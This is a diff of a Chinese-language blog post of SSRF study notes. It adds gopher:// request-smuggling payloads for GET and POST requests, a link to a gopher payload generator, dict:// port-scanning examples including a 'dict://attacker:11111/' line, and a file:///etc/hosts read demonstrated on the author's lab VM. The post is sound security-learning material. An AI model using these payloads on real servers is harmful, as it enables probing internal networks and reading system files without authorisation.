@@ -10,7 +10,7 @@
 <meta name="description" content="在尝试将这些四散的知识整理起来" /><meta name="keywords" content='阅读与分析, SSRF' /><meta itemprop="name" content="SSRF整理">
 <meta itemprop="description" content="在尝试将这些四散的知识整理起来"><meta itemprop="datePublished" content="2024-05-19T17:21:55+08:00" />
 <meta itemprop="dateModified" content="2024-05-19T17:21:55+08:00" />
-<meta itemprop="wordCount" content="1280">
+<meta itemprop="wordCount" content="1304">
 <meta itemprop="keywords" content="阅读与分析,SSRF," /><meta property="og:title" content="SSRF整理" />
 <meta property="og:description" content="在尝试将这些四散的知识整理起来" />
 <meta property="og:type" content="article" />
@@ -34,7 +34,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/66lueflam144.github.io\/posts\/a64076f\/"
-    },"genre": "posts","keywords": "阅读与分析, SSRF","wordcount":  1280 ,
+    },"genre": "posts","keywords": "阅读与分析, SSRF","wordcount":  1304 ,
     "url": "https:\/\/66lueflam144.github.io\/posts\/a64076f\/","datePublished": "2024-05-19T17:21:55+08:00","dateModified": "2024-05-19T17:21:55+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"description": "在尝试将这些四散的知识整理起来"
@@ -110,7 +110,7 @@
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>SSRF整理</span>
       </h1><p class="single-subtitle animate__animated animate__fadeIn">AKASSRF再学习</p></div><div class="post-meta">
       <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
-      Anonymous</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/dig/" class="post-category" title="Category - DIG"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> DIG</a></span></div><div class="post-meta-line"><span title="published on 2024-05-19 17:21:55"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-05-19">2024-05-19</time></span>&nbsp;<span title="1280 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 minutes</span>&nbsp;</div>
+      Anonymous</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/dig/" class="post-category" title="Category - DIG"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> DIG</a></span></div><div class="post-meta-line"><span title="published on 2024-05-19 17:21:55"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-05-19">2024-05-19</time></span>&nbsp;<span title="1304 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -162,10 +162,6 @@
     <li><a href="#绕过">绕过</a>
       <ul>
         <li><a href="#heading">@</a></li>
-      </ul>
-    </li>
-    <li><a href="#url解析规则"><strong>URL解析规则</strong></a>
-      <ul>
         <li><a href="#curl--bash">curl + bash</a></li>
       </ul>
     </li>
@@ -250,8 +246,14 @@
 <code>gopher://host:port/path/data-flow</code></div>
     </div>
   </div>
-<p>一点例子：</p>
+<p><strong>一点例子：</strong></p>
 <br>
+<p>在一端监听6666端口，另一端通过curl+gopher发送数据信息<br>
+<img loading="lazy" src="../post_5/pics/gopher2.png" alt="gopher2" srcset="../post_5/pics/gopher2.png?size=small, ../post_5/pics/gopher2.png?size=medium 1.5x, ../post_5/pics/gopher2.png?size=large 2x" data-title="gopher2" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="../post_5/pics/gopher1.png" alt="gopher1" srcset="../post_5/pics/gopher1.png?size=small, ../post_5/pics/gopher1.png?size=medium 1.5x, ../post_5/pics/gopher1.png?size=large 2x" data-title="gopher1" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<br>(无视那个hello，多打的。)</p>
+<br>
+<hr>
 <h4 id="get请求" class="heading-element">
   <a href="#get%e8%af%b7%e6%b1%82" class="heading-mark"></a>GET请求：</h4><div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -262,7 +264,8 @@
 <pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">GET /ssrf/base/get.php?a=hello HTTP/1.1
 </span></span><span class="line"><span class="cl">HOST: 192.xxx.xxx.xxx</span></span></code></pre></td></tr></table>
 </div>
-</div><p>通过gopher进行传输就是
+</div><p>通过URL编码 + 最后补 <code>%0d%0a</code>(表示结束) 进行gopher协议数据格式化<br>
+通过gopher进行传输就是
 <br></p>
 <div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -271,9 +274,16 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">gopher://192.xxx.xxx.xxx:80/_GET%20/ssrf/base/get.php%3fa=hello%20HTTP/1.1%0d%0AHost:%20192.xxx.xxx.xxx%0d%0A</span></span></code></pre></td></tr></table>
 </div>
-</div><br>
+</div><p><br><br><br><br>举一个例子<br><br>
+<img loading="lazy" src="../post_5/pics/gopherget.png" alt="gopherget" srcset="../post_5/pics/gopherget.png?size=small, ../post_5/pics/gopherget.png?size=medium 1.5x, ../post_5/pics/gopherget.png?size=large 2x" data-title="gopherget" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>截取了抓取的数据包的前两行，通过URL-encode得到结果，然后往前添加<code>_</code>，往后添加<code>%0d%0a</code>，用curl传输，结果如左边。<br>
+换行符URL编码<code>%0A</code>
+<br><br><br><br></p>
 <h4 id="post请求" class="heading-element">
-  <a href="#post%e8%af%b7%e6%b1%82" class="heading-mark"></a>POST请求</h4><br>
+  <a href="#post%e8%af%b7%e6%b1%82" class="heading-mark"></a>POST请求</h4><blockquote>
+<p>一个道理，不再赘述
+<br></p>
+</blockquote>
 <div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -296,6 +306,9 @@
 <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A</span></span></code></pre></td></tr></table>
 </div>
 </div><br>
+<p><a href="https://github.com/tarunkant/Gopherus"target="_blank" rel="external nofollow noopener noreferrer">构造工具</a>
+<br></p>
+<hr>
 <h4 id="利用点" class="heading-element">
   <a href="#%e5%88%a9%e7%94%a8%e7%82%b9" class="heading-mark"></a>利用点</h4><div class="details admonition info open">
     <div class="details-summary admonition-title">
@@ -920,6 +933,11 @@
 <code>ssrf.php?url=dict://attacker:11111/</code></div>
     </div>
   </div>
+<br>
+**举例时间：**
+端口范围：8000-9000<br>
+**dict协议**进行扫描端口
+![dict](../post_5/pics/dict.png)
 <ul>
 <li>如果服务端不支持gopher协议，可尝试dict协议</li>
 <li>不过通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了。</li>
@@ -999,8 +1017,8 @@
 <ul>
 <li>
 <p>原因</p>
-<h2 id="url解析规则" class="heading-element">
-  <a href="#url%e8%a7%a3%e6%9e%90%e8%a7%84%e5%88%99" class="heading-mark"></a><strong>URL解析规则</strong></h2><p>在解析URL时,@符号之前的部分被解析为用户信息(credentials),@之后的部分才是真正的主机地址。所以当解析</p>
+<p><strong>URL解析规则</strong></p>
+<p>在解析URL时,@符号之前的部分被解析为用户信息(credentials),@之后的部分才是真正的主机地址。所以当解析</p>
 <p><code>http://www.baidu.com@10.10.10.10/</code></p>
 <p>时:</p>
 <ul>
@@ -1384,13 +1402,32 @@
 符合上面提到的条件
 <br>所以试一试
 <br>
-<p><img loading="lazy" src="../post_5/pics/2.png" alt="robots" srcset="../post_5/pics/2.png?size=small, ../post_5/pics/2.png?size=medium 1.5x, ../post_5/pics/2.png?size=large 2x" data-title="robots" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
-访问外部是正常的
+<p><strong>访问外部</strong></p>
+<p><img loading="lazy" src="../post_5/pics/2.png" alt="robots" srcset="../post_5/pics/2.png?size=small, ../post_5/pics/2.png?size=medium 1.5x, ../post_5/pics/2.png?size=large 2x" data-title="robots" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <br>
-访问内部：</p>
+<p><strong>访问内部：</strong></p>
 <br>
 <p><img loading="lazy" src="../post_5/pics/3.png" alt="inside" srcset="../post_5/pics/3.png?size=small, ../post_5/pics/3.png?size=medium 1.5x, ../post_5/pics/3.png?size=large 2x" data-title="inside" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
-（PS：用作测试的虚拟机本地网站主页就是这个默认界面）</p></div><div class="post-footer" id="post-footer">
+（PS：用作测试的虚拟机本地网站主页就是这个默认界面）</p>
+<br>
+<hr>
+<p>后面为了方便，就移到了Linux上
+在上述步骤确定存在SSRF之后，尝试用file协议读取文件内容
+<br>
+<code>file:///etc/hosts</code>
+<br>
+<img loading="lazy" src="../post_5/pics/hosts.png" alt="file" srcset="../post_5/pics/hosts.png?size=small, ../post_5/pics/hosts.png?size=medium 1.5x, ../post_5/pics/hosts.png?size=large 2x" data-title="file" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>获取了服务器的hosts文件内容，不过这是一个没有<strong>IP地址和主机名映射</strong>的（一般增加到最下面一行）</p>
+<br>
+<hr>
+<p><strong>dict协议探测端口</strong></p>
+<blockquote>
+<p>http协议也可以，不过要慢一点。</p>
+</blockquote>
+<p><img loading="lazy" src="../post_5/pics/dict.png" alt="dict" srcset="../post_5/pics/dict.png?size=small, ../post_5/pics/dict.png?size=medium 1.5x, ../post_5/pics/dict.png?size=large 2x" data-title="dict" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<br>
+<hr>
+.</div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
